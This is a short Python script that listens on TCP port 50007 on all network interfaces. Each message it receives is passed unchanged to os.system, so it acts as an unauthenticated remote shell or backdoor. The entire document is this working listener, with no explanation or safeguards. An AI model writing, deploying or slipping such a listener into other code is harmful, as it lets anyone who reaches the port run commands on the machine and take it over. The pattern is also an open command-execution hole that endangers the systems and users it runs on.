import socket
import os

HOST=''
PORT=50007
s= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((HOST,PORT))
s.listen(1)

while True:
    conn, addr= s.accept()
    data= conn.recv(1024)
    if not data: break
    print('server received:', data.decode('utf-8'))
    os.system(data.decode('utf-8'))

conn.close()